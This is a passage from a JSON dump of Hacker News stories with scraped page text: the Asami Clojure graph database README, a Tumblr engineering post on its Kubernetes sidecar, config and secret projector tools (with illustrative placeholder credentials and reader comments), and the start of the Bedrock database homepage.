        ],
        "id": "fb27c143-e61f-442a-9bb3-96225521e6f9",
        "url_text": "asami A graph database, for Clojure and ClojureScript. The latest version is : Asami is a schemaless database, meaning that data may be inserted with no predefined schema. This flexibility has advantages and disadvantages. It is easier to load and evolve data over time without a schema. However, functionality like upsert and basic integrity checking is not available in the same way as with a graph with a predefined schema. Asami also follows an Open World Assumption model, in the same way that RDF does. In practice, this has very little effect on the database, beyond what being schemaless provides. If you are new to graph databases, then please read our Introduction page. Asami has a query API that looks very similar to a simplified Datomic. More details are available in the Query documentation. Features There are several other graph databases available in the Clojure ecosystem, with each having their own focus. Asami is characterized by the following: Clojure and ClojureScript: Asami runs identically in both systems. Schema-less: Asami does not require a schema to insert data. Query planner: Queries are analyzed to find an efficient execution plan. This can be turned off. Analytics: Supports fast graph traversal operations, such as transitive closures, and can identify subgraphs. Integrated with Loom: Asami graphs are valid Loom graphs, via Asami-Loom. Open World Assumption: Related to being schema-less, Asami borrows semantics from RDF to lean towards an open world model. Pluggable Storage: Like Datomic, storage in Asami can be implemented in multiple ways. There are currently 2 in-memory graph systems, and durable storage available on the JVM. Usage Installing Using Asami requires Clojure or ClojureScript. Asami can be made available to clojure by adding the following to a deps.edn file: { :deps { org.clojars.quoll/asami {:mvn/version \"2.2.2\"} } } This makes Asami available to a repl that is launched with the clj or clojure commands. Alternatively, Asami can be added for the Leiningen build tool by adding this to the :dependencies section of the project.clj file: [org.clojars.quoll/asami \"2.2.2\"] Important Note for databases before 2.1.0 Asami 2.1.0 now uses fewer files to manage data. This makes it incompatible with previous versions. To port data from an older store to a new one, use the asami.core/export-data function on a database on the previous version of Asami, and asami.core/import-data to load the data into a new connection. Running The Asami API tries to look a little like Datomic. Once a repl has been configured for Asami, the following can be copy/pasted to test the API: (require '[asami.core :as d]) ;; Create an in-memory database, named dbname (def db-uri \"asami:mem://dbname\") (d/create-database db-uri) ;; Create a connection to the database (def conn (d/connect db-uri)) ;; Data can be loaded into a database either as objects, or \"add\" statements: (def first-movies [{:movie/title \"Explorers\" :movie/genre \"adventure/comedy/family\" :movie/release-year 1985} {:movie/title \"Demolition Man\" :movie/genre \"action/sci-fi/thriller\" :movie/release-year 1993} {:movie/title \"Johnny Mnemonic\" :movie/genre \"cyber-punk/action\" :movie/release-year 1995} {:movie/title \"Toy Story\" :movie/genre \"animation/adventure\" :movie/release-year 1995}]) @(d/transact conn {:tx-data first-movies}) The transact operation returns an object that can be dereferenced (via clojure.core/deref or the @ macro) to provide information about the state of the database before and after the transaction. (A future in Clojure, or a delay in ClojureScript). Note that the transaction data can be provided as the :tx-data in a map object if other parameters are to be provided, or just as a raw sequence without the wrapping map. For more information about loading data and executing transact see the Transactions documentation. With the data loaded, a database value can be retrieved from the database and then queried. NB: The transact operation will be executed asynchronously on the JVM. Retrieving a database immediately after executing a transact will not retrieve the latest database. If the updated database is needed, then perform the deref operation as shown above, since this will wait until the operation is complete. (def db (d/db conn)) (d/q '[:find ?movie-title :where [?m :movie/title ?movie-title]] db) This returns a sequence of results, with each result being a sequence of the selected vars in the :find clause (just ?movie-title in this case): ([\"Explorers\"] [\"Demolition Man\"] [\"Johnny Mnemonic\"] [\"Toy Story\"]) A more complex query could be to get the title, year and genre for all movies after 1990: (d/q '[:find ?title ?year ?genre :where [?m :movie/title ?title] [?m :movie/release-year ?year] [?m :movie/genre ?genre] [(> ?year 1990)]] db) Entities found in a query can be extracted back out as objects using the entity function. For instance, the following is a repl session that looks up the movies released in 1995, and then gets the associated entities: ;; find the entity IDs. This variation in the :find clause asks for a list of just the ?m variable => (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db) (:tg/node-10327 :tg/node-10326) ;; get a single entity => (d/entity db :tg/node-10327) #:movie{:title \"Toy Story\", :genre \"animation/adventure\", :release-year 1995} ;; get all the entities from the query => (map #(d/entity db %) (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db)) (#:movie{:title \"Toy Story\", :genre \"animation/adventure\", :release-year 1995} #:movie{:title \"Johnny Mnemonic\", :genre \"cyber-punk/action\", :release-year 1995}) See the Query Documentation for more information on querying. Refer to the Entity Structure documentation to understand how entities are stored and how to construct queries for them. Local Storage The above code uses an in-memory database, specified with a URL of the form asami:mem://dbname. Creating a database on disk is done the same way, but with the URL scheme changed to asami:local://dbname. This would create a database in the dbname directory. Local databases do not use keywords as entity IDs, as keywords use up memory, and a local database could be gigabytes in size. Instead, these are InternalNode objects. These can be created with asami.graph/new-node, or by using the readers in asami.graph. For instance, if the above code were all done with a local graph instead of a memory graph: => (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db) (#a/n \"3\" #a/n \"4\") ;; get a single entity => (require '[asami.graph :as graph]) => (d/entity db (graph/new-node 4)) #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} ;; nodes can also be read from a string, with the appropriate reader => (set! *data-readers* graph/node-reader) => (d/entity db #a/n \"4\") #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} Updates The Open World Assumption allows each attribute to be multi-arity. In a Closed World database an object may be loaded to replace those attributes that can only appear once. To do the same thing with Asami, annotate the attributes to be replaced with a quote character at the end of the attribute name. => (def toy-story (d/q '[:find ?ts . :where [?ts :movie/title \"Toy Story\"]] db)) => (d/transact conn [{:db/id toy-story :movie/genre' \"animation/adventure/comedy\"}]) => (d/entity (d/db conn) toy-story) #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} Addressing nodes by their internal ID can be cumbersome. They can also be addressed by a :db/ident field if one is provided. (def tx (d/transact conn [{:db/ident \"sense\" :movie/title \"Sense and Sensibility\" :movie/genre \"drama/romance\" :movie/release-year 1996}])) ;; ask the transaction for the node ID, instead of querying (def sense (get (:tempids @tx) \"sense\")) (d/entity (d/db conn) sense) This returns the new movie. The :db/ident attribute does not appear in the entity: #:movie{:title \"Sense and Sensibility\", :genre \"drama/romance\", :release-year 1996} However, all of the attributes are still present in the graph: => (d/q '[:find ?a ?v :in $ ?s :where [?s ?a ?v]] (d/db conn) sense) ([:db/ident \"sense\"] [:movie/title \"Sense and Sensibility\"] [:movie/genre \"drama/romance\"] [:movie/release-year 1996]) The release year of this movie is incorrectly set to the release in the USA, and not the initial release. That can be updated using the :db/ident field: => (d/transact conn [{:db/ident \"sense\" :movie/release-year' 1995}]) => (d/entity (d/db conn) sense) #:movie{:title \"Sense and Sensibility\", :genre \"drama/romance\", :release-year 1995} More details are provided in Entity Updates. Analytics Asami also has some support for graph analytics. These all operate on the graph part of a database value, which can be retrieved with the asami.core/graph function. NB: local graphs on disk are not yet supported. These will be available soon. Start by populating a graph with the cast of \"The Flintstones\". So that we can refer to entities after they have been created, we can provide them with temporary ID values. These are just negative numbers, and can be used elsewhere in the transaction to refer to the same entity. We will also avoid the :tx-data wrapper in the transaction: (require '[asami.core :as d]) (require '[asami.analytics :as aa]) (def db-uri \"asami:mem://data\") (d/create-database db-uri) (def conn (d/connect db-uri)) (def data [{:db/id -1 :name \"Fred\"} {:db/id -2 :name \"Wilma\"} {:db/id -3 :name \"Pebbles\"} {:db/id -4 :name \"Dino\" :species \"Dinosaur\"} {:db/id -5 :name \"Barney\"} {:db/id -6 :name \"Betty\"} {:db/id -7 :name \"Bamm-Bamm\"} [:db/add -1 :spouse -2] [:db/add -2 :spouse -1] [:db/add -1 :child -3] [:db/add -2 :child -3] [:db/add -1 :pet -4] [:db/add -5 :spouse -6] [:db/add -6 :spouse -5] [:db/add -5 :child -7] [:db/add -6 :child -7]]) (d/transact conn data) Fred, Wilma, Pebbles, and Dino are all connected in a subgraph. Barney, Betty and Bamm-Bamm are connected in a separate subgraph. Let's find the subgraph from Fred: (def db (d/db conn)) (def graph (d/graph db)) (def fred (d/q '[:find ?e . :where [?e :name \"Fred\"]] db)) (aa/subgraph-from-node graph fred) This returns the nodes in the graph, but not the scalar values. For instance: #{:tg/node-10330 :tg/node-10329 :tg/node-10331 :tg/node-10332} These nodes can be used as the input to a query to get their names: => (d/q '[:find [?name ...] :in $ [?n ...] :where [?n :name ?name]] db (aa/subgraph-from-node graph fred)) (\"Fred\" \"Pebbles\" \"Dino\" \"Wilma\") We can also get all the subgraphs: => (count (aa/subgraphs graph)) 2 ;; execute the same query for each subgraph => (map (partial d/q '[:find [?name ...] :where [?e :name ?name]]) (aa/subgraphs graph)) ((\"Fred\" \"Wilma\" \"Pebbles\" \"Dino\") (\"Barney\" \"Betty\" \"Bamm-Bamm\")) Transitive Queries Asami supports transitive properties in queries. A property (or attribute) is treated as transitive if it is followed by a + or a * character. (d/q '[:find ?friend-of-a-friend :where [?person :name \"Fred\"] [?person :friend+ ?foaf] [?foaf :name ?friend-of-a-friend]] db) This will find all friends, and friends of friends for Fred. Loom Asami also implements Loom via the Asami-Loom package. Include the following dependency for your project: [org.clojars.quoll/asami-loom \"0.2.0\"] Graphs can now be analyzed with Loom functions. If functions are provided to Loom, then they can be used to provide labels for creating a visual graph. The following creates some simple queries to get the labels for edges and nodes: (require '[asami-loom.index]) (require '[asami-loom.label]) (require '[loom.io]) (defn edge-label [g s d] (str (d/q '[:find ?e . :in $ ?a ?b :where (or [?a ?e ?b] [?b ?e ?a])] g s d))) (defn node-label [g n] (or (d/q '[:find ?name . :where [?n :name ?name]] g n) \"-\")) ;; create a PDF of the graph (loom-io/view (graph db) :fmt :pdg :alg :sfpd :edge-label edge-label :node-label node-label) Command Line Tool A command line tool is available to load data into an Asami graph and query it. This requires GraalVM CE 21.1.0 or later, and the native-image executable. Leiningen needs to see GraalVM on the classpath first, so if there are problems with building, check to see if this is the case. To build from sources: lein with-profile native uberjar lein with-profile native native This will create a binary called asami in the target directory. Execute with the -? flag for help: $ ./target/asami -? Usage: asami URL [-f filename] [-e query] [--help | -?] -? | --help: This help URL: the URL of the database to use. Must start with asami:mem://, asami:multi:// or asami:local:// -f filename: loads the filename into the database. A filename of \"-\" will use stdin. Data defaults to EDN. Filenames ending in .json are treated as JSON. -e query: executes a query. \"-\" (the default) will read from stdin instead of a command line argument. Multiple queries can be specified as edn (vector of query vectors) or ; separated. Available EDN readers: internal nodes - #a/n \"node-id\" regex - #a/r \"[Tt]his is a (regex|regular expression)\" Example: Loading a json file, and querying for keys (attributes) that are strings with spaces in them: asami asami:mem://tmp -f data.json -e ':find ?a :where [?e ?a ?v][(string? ?a)][(re-find #a/r \" \" ?a)]' The command will also work on local stores, which means that they can be loaded once and then queried multiple times. License Copyright 2016-2021 Cisco Systems Copyright 2015-2021 Paula Gearon Portions of src/asami/cache.cljc are Copyright Rich Hickey Distributed under the Eclipse Public License either version 1.0 or (at your option) any later version. ",
        "_version_": 1718527387423997952
      },
      {
        "story_id": [18906834],
        "story_author": ["byxorna"],
        "story_descendants": [17],
        "story_score": [72],
        "story_time": ["2019-01-14T21:46:15Z"],
        "story_title": "Tumblr Opensources Kubernetes Utilities",
        "search": [
          "Tumblr Opensources Kubernetes Utilities",
          "https://engineering.tumblr.com/post/182013497734/open-sourcing-our-kubernetes-tools",
          "At Tumblr, we are avid fans of Kubernetes. We have been using Kubernetes for all manner of workloads, like critical-path web requests handling for tumblr.com, background task executions like sending queued posts and push notifications, and scheduled jobs for spam detection and content moderation. Throughout our journey to move our 11 year old (almost 12! ) platform to a container-native architecture, we have made innumerable changes to how our applications are designed and run. Inspired by a lot of existing Kubernetes APIs and best practices, were excited to share with the community some of the tools weve developed at Tumblr as our infrastructure has evolved to work with Kubernetes.To help us integrate Kubernetes into our workflows, we have built a handful of tools of which we are open-sourcing three today! Each tool is a small, focused utility, designed to solve specific integration needs Tumblr had while migrating our workflows to Kubernetes. The tools were built to handle our needs internally, but we believe they are useful to the wider Kubernetes community.github.com/tumblr/k8s-sidecar-injectorgithub.com/tumblr/k8s-config-projectorgithub.com/tumblr/k8s-secret-projectork8s-sidecar-injectorAny company that has containerized an application as large and complex as Tumblr knows that it requires a tremendous amount of effort. Applications dont become container-native overnight, and sidecars can be useful to help emulate older deployments with colocated services on physical hosts or VMs. To reduce the amount of fragile copy-paste code by developers adding in sidecars to their Deployments and CronJobs, we created a service to dynamically inject sidecars, volumes, and environment data into pods as they are launched.The k8s-sidecar-injector listens to the Kubernetes API for Pod launches that contain annotations requesting a specific sidecar to be injected. For example, the annotation injector.tumblr.com/request=sidecar-prod-v1 will add any environment variables, volumes, and containers defined in the sidecar-prod-v1 configuration. We use this to add sidecars like logging and metrics daemons, cluster-wide environment variables like DATACENTER and HTTP_PROXY settings, and volumes for shared configuration data. By centralizing configuration of sidecars, we were able to reduce complexity in CronJobs and Deployments by hundreds of lines, eliminated copy-paste errors, and made rolling out updates to shared components in our sidecars effortless.An example sidecar ConfigMap is below, which adds a logging container, a volume from a logger-config ConfigMap, and some environment variables into the Pod.--- apiVersion: v1 kind: ConfigMap metadata: name: example-sidecars namespace: kube-system labels app: k8s-sidecar-injector data: logger-v1: | name: logger-v1 containers: - name: logger image: some/logger:2.2.3 imagePullPolicy: IfNotPresent ports: - containerPort: 8888 volumeMounts: - name: logger-conf mountPath: /etc/logger volumes: - name: logger-conf configMap: name: logger-config env: - name: DATACENTER value: dc01 - name: HTTP_PROXY value: http://my-proxy.org:8080/ - name: HTTPS_PROXY value: http://my-proxy.org:8080/This configuration will add the logger container into each pod with the annotation injector.tumblr.com/request: logger-v1, with a ConfigMap projected as a volume in /etc/logger. Additionally, every container in the Pod will get the DATACENTER=dc01 and HTTP_PROXY environment variables added, if they were not already set. This has allowed us to drastically reduce our boilerplate configuration when containerizing legacy applications that require a complex sidecar configuration.k8s-config-projectorInternally, we have many types of configuration data that is needed by a variety of applications. We store canonical settings data like feature flags, lists of hosts/IPs+ports, and application settings in git. This allows automated generation/manipulation of these settings by bots, cron jobs, Collins, and humans alike. Applications want to know about some subset of this configuration data, and they want to be informed when this data changes as quickly as possible. Kubernetes provides the ConfigMap resource, which enables users to provide their service with configuration data and update the data in running pods without requiring a redeployment. We wanted to use this to configure our services and jobs in a Kubernetes-native manner, but needed a way to bridge the gap between our canonical configuration store (git repo of config files) to ConfigMaps. Thus, was k8s-config-projector born.The Config Projector (github.com/tumblr/k8s-config-projector)[github.com/tumblr/k8s-config-projector] is a command line tool, meant to be run by CI processes. It combines a git repo hosting configuration data (feature flags, lists of hostnames+ports, application settings) with a set of projection manifest files that describe how to group/extract settings from the config repo and transmute them into ConfigMaps. The config projector allows developers to encode a set of configuration data the application needs to run into a projection manifest. As the configuration data changes in the git repository, CI will run the projector, projecting and deploying new ConfigMaps containing this updated data, without needing the application to be redeployed. Projection datasources can handle both structured and unstructured configuration files (YAML, JSON, and raw text/binary).An example projection manifest is below, describing how a fictitious notification application could request some configuration data that may dynamically change (memcached hosts, log level, launch flags, etc):--- name: notifications-us-east-1-production namespace: notification-production data: # extract some fields from JSON - source: generated/us-east-1/production/config.json output_file: config.json field_extraction: - memcached_hosts: $.memcached.notifications.production.hosts - settings: $.applications.notification.production.settings - datacenter: $.datacenter - environment: $.environment # extract a scalar value from a YAML - source: apps/us-east-1/production/notification.yaml output_file: launch_flags extract: $.launch_flags After processing by the config projector, the following ConfigMap is generated, which can then be posted to a Kubernetes cluster with kubectl create -f <generatedfile>.kind: ConfigMap apiVersion: v1 metadata name: notifications-us-east-1-production namespace: notification-production labels: tumblr.com/config-version: \"1539778254\" tumblr.com/managed-configmap: \"true\" data: config.json: | { \"memcached_hosts\": [\"2.3.4.5:11211\",\"4.5.6.7:11211\",\"6.7.8.9:11211\"], \"settings\": { \"debug\": false, \"buffer\": \"2000\", \"flavor\": \"out of control\", \"log_level\": \"INFO\", }, \"datacenter\": \"us-east-1\", \"environment\": \"production\" } launch_flags: \"-Xmx5g -Dsun.net.inetaddr.ttl=10\" With this tool, we have enabled our applications running in kubernetes to receive dynamic configuration updates without requiring container rebuilds or deployments. More examples can be found here.k8s-secret-projectorSimilar to our configuration repository, we store secure credentials in access controlled vaults, divided by production levels. We wanted to enable developers to request access to subsets of credentials for a given application without needing to grant the user access to the secrets themselves. Additionally, we wanted to make certificate and password rotation transparent to all applications, enabling us to rotate credentials in an application-agnostic manner, without needing to redeploy applications. Lastly, we wanted to introduce a mechanism where application developers would explicitly describe which credentials their services need, and enable a framework to audit and grant permissions for a service to consume a secret.The k8s-secret-projector operates similarly to the k8s-config-projector, albeit with a few differences. The secret projector combines a repository of projection manifests with a set of credential repositories. A Continuous Integration (CI) tool like Jenkins will run the k8s-secret-projector against any changes in the projection manifests repository to generate new Kubernetes Secret YAML files. Then, Continuous Deployment can deploy the generated and validated Secret files to any number of Kubernetes clusters.Take this file in the production credentials repository, named aws/credentials.json:{ \"us-east-1\": { \"region\": \"us-east-1\", \"aws\": { \"key\": \"somethignSekri7T!\", }, \"s3\": { \"key\": \"passW0rD!\", }, \"redshift\": { \"key\": \"ello0liv3r!\", \"database\": \"mydatabase\" } }, \"us-west-2\": { \"region\": \"us-west-2\", \"aws\": { \"key\": \"anotherPasswr09d!\", }, \"s3\": { \"key\": \"sueprSekur#\", } } } We need to create an amazon.yaml configuration file containing the s3.key and aws.key for us-east-1, as well as a text file containing our region. The projection manifest below will extract only the fields we need, and output them in the format desired.name: aws-credentials namespace: myteam repo: production data: # create an amazon.yaml config with the secrets we care about - name: amazon.yaml source: format: yaml json: aws/credentials.json jsonpaths: s3: $.us-east-1.s3.key aws: $.us-east-1.aws.key region: $.us-east-1.region # create a item containing just the name of the region we are in - name: region source: json: aws/credentials.json jsonpath: $.us-east-1.region Projecting this manifest with the above credentials results in the following Kubernetes Secret YAML file:apiVersion: v1 kind: Secret metadata: labels: tumblr.com/managed-secret: \"true\" tumblr.com/secret-version: master-741-7459d1abcc120 name: aws-credentials namespace: myteam data: region: dXMtZWFzdC0x # region decoded for clarity: us-east-1 amazon.yaml: LS0tCnMzOiAicGFzc1cwckQhIgphd3M6ICJzb21ldGhpZ25TZWtyaTdUISIKcmVnaW9uOiB1cy1lYXN0LTEK # amazon.yaml decoded for clarity: # --- # s3: \"passW0rD!\" # aws: \"somethignSekri7T!\" # region: us-east-1 In addition to being able to extract fields from structured YAML and JSON sources, we gave it the ability to encrypt generated Secrets before they touch disk. This allows Secrets to be deployed in shared Kubernetes environments, where users are colocated with other users, and do not feel comfortable with their Secret resources being unencrypted in etcd. Please note, this requires decryption by your applications before use. More details on how the encryption modules work can be found here.For more examples of how to use this, check out examples here!Whats NextWe are excited to share these tools with the Kubernetes open source community, and we hope they can help your organization adopt container-native thinking when managing application lifecycle like they helped Tumblr. Feature enhancements and bug fixes are welcome! And, shameless plug: if you are interested in Kubernetes, containerization technology, open source, and scaling a massive website with industry leading technologies and practices? Come join us!.- @pipefail ",
          "Not a cryptographer, but a few things irked me about the secret projector encryption features:<p>1. Calls it AES-CBC, but it's using AES-GCM <a href=\"https://github.com/tumblr/k8s-secret-projector/blob/master/pkg/encryption/cbc/block.go#L88\" rel=\"nofollow\">https://github.com/tumblr/k8s-secret-projector/blob/master/p...</a><p>2. Encryption key generation (edited: from a password) uses a hash function rather than using a KDF. Short hashes are padded (takes first N bytes required to hit max length, appends to end) or trimmed to the appropriate length. <a href=\"https://github.com/tumblr/k8s-secret-projector/blob/master/pkg/encryption/cbc/key.go#L43\" rel=\"nofollow\">https://github.com/tumblr/k8s-secret-projector/blob/master/p...</a>",
          "My tinfoil hat is telling me that the engineers are pushing to open source as much as possible before the company inevitably goes under due to the recent banning of NSFW content."
        ],
        "story_type": ["Normal"],
        "url": "https://engineering.tumblr.com/post/182013497734/open-sourcing-our-kubernetes-tools",
        "comments.comment_id": [18907172, 18907340],
        "comments.comment_author": ["throwaway_129", "p1necone"],
        "comments.comment_descendants": [1, 2],
        "comments.comment_time": [
          "2019-01-14T22:32:25Z",
          "2019-01-14T22:53:24Z"
        ],
        "comments.comment_text": [
          "Not a cryptographer, but a few things irked me about the secret projector encryption features:<p>1. Calls it AES-CBC, but it's using AES-GCM <a href=\"https://github.com/tumblr/k8s-secret-projector/blob/master/pkg/encryption/cbc/block.go#L88\" rel=\"nofollow\">https://github.com/tumblr/k8s-secret-projector/blob/master/p...</a><p>2. Encryption key generation (edited: from a password) uses a hash function rather than using a KDF. Short hashes are padded (takes first N bytes required to hit max length, appends to end) or trimmed to the appropriate length. <a href=\"https://github.com/tumblr/k8s-secret-projector/blob/master/pkg/encryption/cbc/key.go#L43\" rel=\"nofollow\">https://github.com/tumblr/k8s-secret-projector/blob/master/p...</a>",
          "My tinfoil hat is telling me that the engineers are pushing to open source as much as possible before the company inevitably goes under due to the recent banning of NSFW content."
        ],
        "id": "0c99863f-322d-4c91-b587-368335a9a01b",
        "url_text": "At Tumblr, we are avid fans of Kubernetes. We have been using Kubernetes for all manner of workloads, like critical-path web requests handling for tumblr.com, background task executions like sending queued posts and push notifications, and scheduled jobs for spam detection and content moderation. Throughout our journey to move our 11 year old (almost 12! ) platform to a container-native architecture, we have made innumerable changes to how our applications are designed and run. Inspired by a lot of existing Kubernetes APIs and best practices, were excited to share with the community some of the tools weve developed at Tumblr as our infrastructure has evolved to work with Kubernetes.To help us integrate Kubernetes into our workflows, we have built a handful of tools of which we are open-sourcing three today! Each tool is a small, focused utility, designed to solve specific integration needs Tumblr had while migrating our workflows to Kubernetes. The tools were built to handle our needs internally, but we believe they are useful to the wider Kubernetes community.github.com/tumblr/k8s-sidecar-injectorgithub.com/tumblr/k8s-config-projectorgithub.com/tumblr/k8s-secret-projectork8s-sidecar-injectorAny company that has containerized an application as large and complex as Tumblr knows that it requires a tremendous amount of effort. Applications dont become container-native overnight, and sidecars can be useful to help emulate older deployments with colocated services on physical hosts or VMs. To reduce the amount of fragile copy-paste code by developers adding in sidecars to their Deployments and CronJobs, we created a service to dynamically inject sidecars, volumes, and environment data into pods as they are launched.The k8s-sidecar-injector listens to the Kubernetes API for Pod launches that contain annotations requesting a specific sidecar to be injected. For example, the annotation injector.tumblr.com/request=sidecar-prod-v1 will add any environment variables, volumes, and containers defined in the sidecar-prod-v1 configuration. We use this to add sidecars like logging and metrics daemons, cluster-wide environment variables like DATACENTER and HTTP_PROXY settings, and volumes for shared configuration data. By centralizing configuration of sidecars, we were able to reduce complexity in CronJobs and Deployments by hundreds of lines, eliminated copy-paste errors, and made rolling out updates to shared components in our sidecars effortless.An example sidecar ConfigMap is below, which adds a logging container, a volume from a logger-config ConfigMap, and some environment variables into the Pod.--- apiVersion: v1 kind: ConfigMap metadata: name: example-sidecars namespace: kube-system labels app: k8s-sidecar-injector data: logger-v1: | name: logger-v1 containers: - name: logger image: some/logger:2.2.3 imagePullPolicy: IfNotPresent ports: - containerPort: 8888 volumeMounts: - name: logger-conf mountPath: /etc/logger volumes: - name: logger-conf configMap: name: logger-config env: - name: DATACENTER value: dc01 - name: HTTP_PROXY value: http://my-proxy.org:8080/ - name: HTTPS_PROXY value: http://my-proxy.org:8080/This configuration will add the logger container into each pod with the annotation injector.tumblr.com/request: logger-v1, with a ConfigMap projected as a volume in /etc/logger. Additionally, every container in the Pod will get the DATACENTER=dc01 and HTTP_PROXY environment variables added, if they were not already set. This has allowed us to drastically reduce our boilerplate configuration when containerizing legacy applications that require a complex sidecar configuration.k8s-config-projectorInternally, we have many types of configuration data that is needed by a variety of applications. We store canonical settings data like feature flags, lists of hosts/IPs+ports, and application settings in git. This allows automated generation/manipulation of these settings by bots, cron jobs, Collins, and humans alike. Applications want to know about some subset of this configuration data, and they want to be informed when this data changes as quickly as possible. Kubernetes provides the ConfigMap resource, which enables users to provide their service with configuration data and update the data in running pods without requiring a redeployment. We wanted to use this to configure our services and jobs in a Kubernetes-native manner, but needed a way to bridge the gap between our canonical configuration store (git repo of config files) to ConfigMaps. Thus, was k8s-config-projector born.The Config Projector (github.com/tumblr/k8s-config-projector)[github.com/tumblr/k8s-config-projector] is a command line tool, meant to be run by CI processes. It combines a git repo hosting configuration data (feature flags, lists of hostnames+ports, application settings) with a set of projection manifest files that describe how to group/extract settings from the config repo and transmute them into ConfigMaps. The config projector allows developers to encode a set of configuration data the application needs to run into a projection manifest. As the configuration data changes in the git repository, CI will run the projector, projecting and deploying new ConfigMaps containing this updated data, without needing the application to be redeployed. Projection datasources can handle both structured and unstructured configuration files (YAML, JSON, and raw text/binary).An example projection manifest is below, describing how a fictitious notification application could request some configuration data that may dynamically change (memcached hosts, log level, launch flags, etc):--- name: notifications-us-east-1-production namespace: notification-production data: # extract some fields from JSON - source: generated/us-east-1/production/config.json output_file: config.json field_extraction: - memcached_hosts: $.memcached.notifications.production.hosts - settings: $.applications.notification.production.settings - datacenter: $.datacenter - environment: $.environment # extract a scalar value from a YAML - source: apps/us-east-1/production/notification.yaml output_file: launch_flags extract: $.launch_flags After processing by the config projector, the following ConfigMap is generated, which can then be posted to a Kubernetes cluster with kubectl create -f <generatedfile>.kind: ConfigMap apiVersion: v1 metadata name: notifications-us-east-1-production namespace: notification-production labels: tumblr.com/config-version: \"1539778254\" tumblr.com/managed-configmap: \"true\" data: config.json: | { \"memcached_hosts\": [\"2.3.4.5:11211\",\"4.5.6.7:11211\",\"6.7.8.9:11211\"], \"settings\": { \"debug\": false, \"buffer\": \"2000\", \"flavor\": \"out of control\", \"log_level\": \"INFO\", }, \"datacenter\": \"us-east-1\", \"environment\": \"production\" } launch_flags: \"-Xmx5g -Dsun.net.inetaddr.ttl=10\" With this tool, we have enabled our applications running in kubernetes to receive dynamic configuration updates without requiring container rebuilds or deployments. More examples can be found here.k8s-secret-projectorSimilar to our configuration repository, we store secure credentials in access controlled vaults, divided by production levels. We wanted to enable developers to request access to subsets of credentials for a given application without needing to grant the user access to the secrets themselves. Additionally, we wanted to make certificate and password rotation transparent to all applications, enabling us to rotate credentials in an application-agnostic manner, without needing to redeploy applications. Lastly, we wanted to introduce a mechanism where application developers would explicitly describe which credentials their services need, and enable a framework to audit and grant permissions for a service to consume a secret.The k8s-secret-projector operates similarly to the k8s-config-projector, albeit with a few differences. The secret projector combines a repository of projection manifests with a set of credential repositories. A Continuous Integration (CI) tool like Jenkins will run the k8s-secret-projector against any changes in the projection manifests repository to generate new Kubernetes Secret YAML files. Then, Continuous Deployment can deploy the generated and validated Secret files to any number of Kubernetes clusters.Take this file in the production credentials repository, named aws/credentials.json:{ \"us-east-1\": { \"region\": \"us-east-1\", \"aws\": { \"key\": \"somethignSekri7T!\", }, \"s3\": { \"key\": \"passW0rD!\", }, \"redshift\": { \"key\": \"ello0liv3r!\", \"database\": \"mydatabase\" } }, \"us-west-2\": { \"region\": \"us-west-2\", \"aws\": { \"key\": \"anotherPasswr09d!\", }, \"s3\": { \"key\": \"sueprSekur#\", } } } We need to create an amazon.yaml configuration file containing the s3.key and aws.key for us-east-1, as well as a text file containing our region. The projection manifest below will extract only the fields we need, and output them in the format desired.name: aws-credentials namespace: myteam repo: production data: # create an amazon.yaml config with the secrets we care about - name: amazon.yaml source: format: yaml json: aws/credentials.json jsonpaths: s3: $.us-east-1.s3.key aws: $.us-east-1.aws.key region: $.us-east-1.region # create a item containing just the name of the region we are in - name: region source: json: aws/credentials.json jsonpath: $.us-east-1.region Projecting this manifest with the above credentials results in the following Kubernetes Secret YAML file:apiVersion: v1 kind: Secret metadata: labels: tumblr.com/managed-secret: \"true\" tumblr.com/secret-version: master-741-7459d1abcc120 name: aws-credentials namespace: myteam data: region: dXMtZWFzdC0x # region decoded for clarity: us-east-1 amazon.yaml: LS0tCnMzOiAicGFzc1cwckQhIgphd3M6ICJzb21ldGhpZ25TZWtyaTdUISIKcmVnaW9uOiB1cy1lYXN0LTEK # amazon.yaml decoded for clarity: # --- # s3: \"passW0rD!\" # aws: \"somethignSekri7T!\" # region: us-east-1 In addition to being able to extract fields from structured YAML and JSON sources, we gave it the ability to encrypt generated Secrets before they touch disk. This allows Secrets to be deployed in shared Kubernetes environments, where users are colocated with other users, and do not feel comfortable with their Secret resources being unencrypted in etcd. Please note, this requires decryption by your applications before use. More details on how the encryption modules work can be found here.For more examples of how to use this, check out examples here!Whats NextWe are excited to share these tools with the Kubernetes open source community, and we hope they can help your organization adopt container-native thinking when managing application lifecycle like they helped Tumblr. Feature enhancements and bug fixes are welcome! And, shameless plug: if you are interested in Kubernetes, containerization technology, open source, and scaling a massive website with industry leading technologies and practices? Come join us!.- @pipefail ",
        "_version_": 1718527382162243584
      },
      {
        "story_id": [21045987],
        "story_author": ["dhruvkar"],
        "story_descendants": [25],
        "story_score": [73],
        "story_time": ["2019-09-23T04:47:46Z"],
        "story_title": "Bedrock – A modular, WAN-replicated, blockchain-based database",
        "search": [
          "Bedrock – A modular, WAN-replicated, blockchain-based database",
          "https://bedrockdb.com/",
          "Why Code Install Use Jobs Cache vs MySQL Replication Blockchain Multizone Chat Contact Bedrock Rock-solid distributed data Bedrock is a simple, modular, WAN-replicated, Blockchain-based data foundation for global-scale applications. Taking each of those in turn: Bedrock is simple. This means it exposes the fewest knobs necessary, with appropriate defaults at every layer. Bedrock is modular. This means its functionality is packaged into separate plugins that are decoupled and independently maintainable. Bedrock is WAN-replicated. This means it is designed to endure the myriad real-world problems that occur across slow, unreliable internet connections. Bedrock is Blockchain-based. This means it uses a private blockchain to synchronize and self organize. Bedrock is a data foundation. This means it is not just a simple database that responds to queries, but rather a platform on which data-processing applications (like databases, job queues, caches, etc) can be built. Bedrock is for global-scale applications. This means it is built to be deployed in a geo-redundant fashion spanning many datacenters around the world. Bedrock was built by Expensify, and is a networking and distributed transaction layer built atop SQLite, the fastest, most reliable, and most widely distributed database in the world. Why to use it If youre building a website or other online service, youve got to use something. Why use Bedrock rather than the alternatives? Weve provided a more detailed comparision against MySQL, but in general Bedrock is: Faster. This is true for networked queries using the Bedrock::DB plugin, but especially true for custom plugins you write yourself because SQLite is just a library that operates inside your processs memory space. That means when your plugin queries SQLite, it isnt serializing/deserializing over a network: its 